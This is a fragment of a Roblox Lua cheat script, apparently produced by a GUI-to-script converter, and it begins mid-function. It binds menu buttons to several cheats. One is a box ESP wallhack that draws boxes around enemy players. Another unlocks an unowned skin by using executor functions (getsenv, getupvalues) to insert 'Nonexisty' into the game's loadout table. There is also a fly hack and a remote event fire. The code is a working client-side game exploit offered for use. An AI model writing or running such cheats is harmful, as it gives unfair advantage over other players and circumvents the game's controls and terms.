	script.Parent.ware.PlayerFrame.DSpoofs.pc.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("MouseButton1")
	end)
	
	
	
	
	
	script.Parent.ware.VisualFrame.viss.box.MouseButton1Click:Connect(function()
		-- This is using SXDL
	
		local lplr = game.Players.LocalPlayer
		local camera = game:GetService("Workspace").CurrentCamera
		local CurrentCamera = workspace.CurrentCamera
		local worldToViewportPoint = CurrentCamera.worldToViewportPoint
	
		local HeadOff = Vector3.new(0, 0.5, 0)
		local LegOff = Vector3.new(0,3,0)
	
		for i,v in pairs(game.Players:GetChildren()) do
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end
	
		game.Players.PlayerAdded:Connect(function(v)
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end)
	end)
	
	script.Parent.ware.PlayerFrame.Others.Nonexisty.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftFoot:Destroy()
	
		game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightFoot:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
	
		local esc = game.Players.LocalPlayer.Character.LowerTorso:GetChildren()
	
		for i, v in pairs(esc) do
	
			v:Destroy()
	
			wait()
	
		end
	
		local vm = game:GetService("ReplicatedStorage").Viewmodels.Arms.Delinquent
	
		vm.Name = "Holder"
	
		local toName = game:GetService("ReplicatedStorage").Viewmodels.Arms["Nonexisty"]
	
		toName.Name = "Delinquent"
	
		local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);
	
	
		local Loadout;
	
		for i,v in pairs(getupvalues(Core.ViewItems)) do
	
			if typeof(v) == "table" then
	
				if v.Skins then
	
					Loadout = v;
	
				end
	
			end
	
		end
	
	
		table.insert(Loadout.Skins, "Nonexisty")
	end)
	
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
			if inputObject.KeyCode == Enum.KeyCode.RightShift  then 
				script.Parent.ware.Visible = not script.Parent.ware.Visible
			end
		end
	end
	game:GetService("UserInputService").InputBegan:connect(onKeyPress)
	
	
	repeat wait() 
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
	local mouse = game.Players.LocalPlayer:GetMouse() 
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer 
	local torso = plr.Character.Head 
	local flying = false
	local deb = true 
	local ctrl = {f = 0, b = 0, l = 0, r = 0} 
	local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	local maxspeed = 300
	local speed = 0 
	
	function Fly() 
		local bg = Instance.new("BodyGyro", torso) 
		bg.P = 9e4 
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		bg.cframe = torso.CFrame 
		local bv = Instance.new("BodyVelocity", torso) 
		bv.velocity = Vector3.new(0,0.1,0) 
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
		repeat wait() 
			plr.Character.Humanoid.PlatformStand = true 
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
				speed = speed+.5+(speed/maxspeed) 
				if speed > maxspeed then 
					speed = maxspeed 
				end 
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
				speed = speed-1 
				if speed < 0 then 
					speed = 0 
				end 
			end 
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
			else 
				bv.velocity = Vector3.new(0,0.1,0) 
			end 
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
		until not flying 
		ctrl = {f = 0, b = 0, l = 0, r = 0} 
		lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		speed = 0 
		bg:Destroy() 
		bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
	end 
	mouse.KeyDown:connect(function(key) 
		if key:lower() == "t" then 
			if flying then flying = false 
			else 
				flying = true 
				Fly() 
			end 
		elseif key:lower() == "w" then 
			ctrl.f = 1 
		elseif key:lower() == "s" then 
			ctrl.b = -1 
		elseif key:lower() == "a" then 
			ctrl.l = -1 
		elseif key:lower() == "d" then 
			ctrl.r = 1 
		end 
	end) 
	mouse.KeyUp:connect(function(key) 
		if key:lower() == "w" then 
			ctrl.f = 0 
		elseif key:lower() == "s" then 
			ctrl.b = 0 
		elseif key:lower() == "a" then 
			ctrl.l = 0 
		elseif key:lower() == "d" then 
			ctrl.r = 0 
		end 
	end)
	Fly()
end
coroutine.wrap(JPSURY_fake_script)()
